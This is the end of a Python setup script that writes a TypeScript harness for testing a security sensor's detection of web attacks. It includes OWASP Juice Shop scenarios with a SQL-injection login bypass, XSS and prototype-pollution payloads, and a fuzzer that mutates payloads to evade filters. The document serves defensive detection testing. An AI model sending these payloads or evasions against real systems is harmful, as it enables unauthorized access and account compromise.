        { id: 'benign-43', payload: "😊", target: 'body', field: 'emoji', description: 'Emoji input' },
        { id: 'benign-44', payload: "script", target: 'query', field: 'search', description: 'Search term script' },
        { id: 'benign-45', payload: "union", target: 'query', field: 'search', description: 'Search term union' },
        { id: 'benign-46', payload: "select", target: 'query', field: 'search', description: 'Search term select' },
        { id: 'benign-47', payload: "exec", target: 'query', field: 'search', description: 'Search term exec' },
        { id: 'benign-48', payload: "system", target: 'query', field: 'search', description: 'Search term system' },
        { id: 'benign-49', payload: "eval", target: 'query', field: 'search', description: 'Search term eval' },
        { id: 'benign-50', payload: "admin", target: 'query', field: 'search', description: 'Search term admin' }
    ]
};
"""

files['src/payloads/index.ts'] = """import { sqli } from './sqli';
import { xss } from './xss';
import { ssrf } from './ssrf';
import { cmdi } from './cmdi';
import { pathTraversal } from './path-traversal';
import { auth } from './auth';
import { ssti } from './ssti';
import { xxe } from './xxe';
import { protoPollution } from './proto-pollution';
import { benign } from './benign';
import { PayloadSuite } from '../types';

export const allSuites: PayloadSuite[] = [
    sqli,
    xss,
    ssrf,
    cmdi,
    pathTraversal,
    auth,
    ssti,
    xxe,
    protoPollution,
    benign
];
"""

files['src/scenarios/juice-shop.ts'] = """import { PayloadSuite } from '../types';

export const juiceShopScenarios: PayloadSuite = {
    name: 'juice-shop-scenarios',
    type: 'attack',
    payloads: [
        {
            id: 'js-1',
            payload: "' OR true --",
            target: 'body',
            field: 'email',
            description: 'Juice Shop login bypass',
            method: 'POST',
            path: '/rest/user/login',
            headers: { 'Content-Type': 'application/json' }
        },
        {
            id: 'js-2',
            payload: "<iframe src=\\"javascript:alert(`xss`)\\">",
            target: 'query',
            field: 'q',
            description: 'Juice Shop product search XSS',
            method: 'GET',
            path: '/api/Products'
        },
        {
            id: 'js-3',
            payload: "{\\"__proto__\\": {\\"polluted\\": \\"yes\\"}}",
            target: 'body',
            field: 'raw',
            description: 'Juice Shop SecurityQuestions proto pollution',
            method: 'POST',
            path: '/api/SecurityQuestions',
            headers: { 'Content-Type': 'application/json' }
        },
        {
            id: 'js-4',
            payload: "<<script>foo</script>iframe src=\\"javascript:alert(`xss`)\\">",
            target: 'body',
            field: 'message',
            description: 'Juice Shop stored XSS in reviews',
            method: 'POST',
            path: '/rest/products/reviews',
            headers: { 'Content-Type': 'application/json' }
        }
    ]
};
"""

files['src/scenarios/fuzz.ts'] = """import { Payload, PayloadSuite } from '../types';

function mutatePayload(payloadStr: string): string[] {
    const mutations: string[] = [];
    mutations.push(payloadStr.toUpperCase());
    mutations.push(payloadStr.toLowerCase());
    mutations.push(encodeURIComponent(payloadStr));
    mutations.push(payloadStr + '%00');
    mutations.push('%00' + payloadStr);
    mutations.push(payloadStr.replace(/ /g, '/**/'));
    mutations.push(payloadStr.replace(/ /g, '\\t'));
    mutations.push(payloadStr.replace(/ /g, '\\n'));
    return mutations;
}

export function generateFuzzSuite(baseSuite: PayloadSuite): PayloadSuite {
    const fuzzedPayloads: Payload[] = [];
    for (const p of baseSuite.payloads) {
        const mutations = mutatePayload(p.payload);
        mutations.forEach((m, index) => {
            fuzzedPayloads.push({
                ...p,
                id: `${p.id}-fuzz-${index}`,
                payload: m,
                description: `${p.description} (Fuzzed ${index})`
            });
        });
    }
    return {
        name: `${baseSuite.name}-fuzz`,
        type: baseSuite.type,
        payloads: fuzzedPayloads
    };
}
"""

files['src/harness.ts'] = """import axios, { AxiosError, AxiosRequestConfig } from 'axios';
import { PayloadSuite, SuiteResult, TestResult, Payload } from './types';
import { config } from './config';
import { determineResult } from './oracle';
import { allSuites } from './payloads';
import { juiceShopScenarios } from './scenarios/juice-shop';
import { generateFuzzSuite } from './scenarios/fuzz';
import { generateReport } from './reporter';

export class TestHarness {
    async runSuite(suite: PayloadSuite): Promise<SuiteResult> {
        console.log(`Running suite: ${suite.name} (${suite.payloads.length} payloads)`);
        const results: TestResult[] = [];
        
        for (let i = 0; i < suite.payloads.length; i += config.CONCURRENCY) {
            const batch = suite.payloads.slice(i, i + config.CONCURRENCY);
            const batchPromises = batch.map(p => this.runPayload(p, suite.name, suite.type));
            const batchResults = await Promise.all(batchPromises);
            results.push(...batchResults);
        }
        
        return {
            suiteName: suite.name,
            type: suite.type,
            results
        };
    }
    
    private async runPayload(payload: Payload, suiteName: string, suiteType: 'attack' | 'benign'): Promise<TestResult> {
        const startTime = Date.now();
        const requestConfig = this.buildRequest(payload);
        
        try {
            const response = await axios(requestConfig);
            const latencyMs = Date.now() - startTime;
            const status = determineResult(response.status, response.data, response.headers, payload);
            
            return {
                payloadId: payload.id,
                suiteName,
                type: suiteType,
                status,
                latencyMs,
                statusCode: response.status
            };
        } catch (error) {
            const latencyMs = Date.now() - startTime;
            if (axios.isAxiosError(error) && error.response) {
                const status = determineResult(error.response.status, error.response.data, error.response.headers, payload);
                return {
                    payloadId: payload.id,
                    suiteName,
                    type: suiteType,
                    status,
                    latencyMs,
                    statusCode: error.response.status
                };
            }
            
            return {
                payloadId: payload.id,
                suiteName,
                type: suiteType,
                status: 'ERROR',
                latencyMs,
                errorMessage: error instanceof Error ? error.message : String(error)
            };
        }
    }
    
    private buildRequest(payload: Payload): AxiosRequestConfig {
        const url = new URL(payload.path || '/', config.SENSOR_URL);
        const requestConfig: AxiosRequestConfig = {
            method: payload.method || 'GET',
            timeout: config.TIMEOUT_MS,
            headers: {
                ...payload.headers,
                'User-Agent': 'Santh-TestHarness/1.0'
            },
            validateStatus: () => true
        };
        
        if (payload.target === 'query') {
            url.searchParams.append(payload.field, payload.payload);
        } else if (payload.target === 'header') {
            requestConfig.headers![payload.field] = payload.payload;
        } else if (payload.target === 'cookie') {
            requestConfig.headers!['Cookie'] = `${payload.field}=${payload.payload}`;
        } else if (payload.target === 'body') {
            requestConfig.method = payload.method || 'POST';
            if (payload.field === 'raw') {
                try {
                    requestConfig.data = JSON.parse(payload.payload);
                    requestConfig.headers!['Content-Type'] = 'application/json';
                } catch {
                    requestConfig.data = payload.payload;
                    requestConfig.headers!['Content-Type'] = 'text/plain';
                }
            } else {
                requestConfig.data = { [payload.field]: payload.payload };
                requestConfig.headers!['Content-Type'] = 'application/json';
            }
        }
        
        requestConfig.url = url.toString();
        return requestConfig;
    }
}

async function main() {
    console.log(`Starting Santh Testbed Harness`);
    console.log(`Targeting Sensor: ${config.SENSOR_URL}`);
    console.log(`Upstream: ${config.UPSTREAM_URL}`);
    
    try {
        await axios.get(config.SENSOR_URL, { timeout: 2000, validateStatus: () => true });
    } catch (e) {
        console.warn(`[WARNING] Could not connect to sensor at ${config.SENSOR_URL}. Harness will proceed but tests may ERROR. Message: ${e instanceof Error ? e.message : String(e)}`);
    }

    const harness = new TestHarness();
    const allResults: SuiteResult[] = [];
    
    const suitesToRun = [...allSuites, juiceShopScenarios];
    
    for (const suite of suitesToRun) {
        const result = await harness.runSuite(suite);
        allResults.push(result);
    }
    
    const report = generateReport(allResults);
    
    console.log('\\n--- Detection Report ---');
    console.log(JSON.stringify(report, null, 2));
}

if (require.main === module) {
    main().catch(err => {
        console.error('Fatal error in harness:', err);
        process.exit(1);
    });
}
"""

files['results/.gitkeep'] = ""

for rel_path, content in files.items():
    full_path = os.path.join(BASE_DIR, rel_path)
    with open(full_path, 'w') as f:
        f.write(content)

print(f"Testbed setup complete in {BASE_DIR}")
